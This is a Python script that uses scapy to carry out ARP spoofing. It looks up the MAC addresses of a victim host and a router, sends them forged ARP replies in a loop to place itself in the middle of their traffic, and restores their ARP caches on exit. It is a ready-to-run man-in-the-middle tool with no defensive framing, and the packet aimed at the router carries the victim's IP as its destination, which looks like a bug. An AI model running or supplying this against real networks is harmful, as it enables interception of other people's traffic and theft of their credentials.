#!/usr/bin/python
# Author: ablil
# Description: ARP Spoofer

from scapy import all as scapy
import time
import sys
import re

class ARPSpoofer:
    def __init__(self, victim, router,victim_mac=None, router_mac=None, interface=None):

        scapy.conf.verb = 0 # disable verbose mode
        if interface:
            scapy.conf.iface = interface
        print('Using interface {}'.format(scapy.conf.iface))

        self.victim  = victim
        self.router = router
        self.victim_mac = victim_mac if victim_mac else self.__get_mac(self.victim)
        self.router_mac = router_mac if router_mac else self.__get_mac(self.router)

    def __get_mac(self, ip):
        print("Fetchin MAC of {} ...".format(ip))

        pkt = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ip)
        ans, uns = scapy.srp(pkt, timeout=2, retry=10)

        for sent, received in ans:
            return received[scapy.Ether].src

        print("Failed to get MAC address of {}".format(ip))
        exit(3)

    def run(self):
        vpkt = scapy.ARP(op=2, psrc=self.router, pdst=self.victim, hwdst=self.victim_mac)
        rpkt = scapy.ARP(op=2, psrc=self.victim, pdst=self.victim, hwdst=self.router_mac)

        print("Victim(IP: {}, MAC: {})".format(self.victim, self.victim_mac))
        print("Router(IP: {}, MAC: {})".format(self.router, self.router_mac))

        print("Starting ARP Spoofing ...")
        while True:
            scapy.send(vpkt)
            scapy.send(rpkt)
            time.sleep(5)

    def stop(self):
        vpkt = scapy.ARP(op=2,
                psrc=self.router, pdst=self.victim,
                hwdst=self.victim_mac, hwsrc=self.router_mac)
        rpkt = scapy.ARP(op=2,
                psrc=self.victim, pdst=self.victim,
                hwdst=self.router_mac, hwsrc=self.victim_mac)

        # send five packets
        scapy.send(vpkt, count=5)
        scapy.send(rpkt, count=5)
        print("ARP Spoof stoped")

def usage():
    print("ARP Spoofer")
    print("Usage: python3 {} victimIP routerIP interface".format(sys.argv[0]))
    print("Usage: python3 {} victimIP victimMAC routerIP routerMAC interface".format(sys.argv[0]))
    print("")
    print("Example: ./spoof.py 192.168.1.4 192.168.0.1 wlo1")
    sys.exit(1)

def main():
    spoofer = None
    try:
        if len(sys.argv[1:]) == 3:
            spoofer = ARPSpoofer(sys.argv[1], sys.argv[2], interface=sys.argv[3])
            spoofer.run()
        elif len(sys.argv[1:]) == 5:
            spoofer = ARPSpoofer(sys.argv[1], sys.argv[3], sys.argv[2], sys.argv[4], sys.argv[5])
            spoofer.run()
        else:
            usage()
    except KeyboardInterrupt:
        if spoofer:
            spoofer.stop()

if __name__=='__main__':
    main()
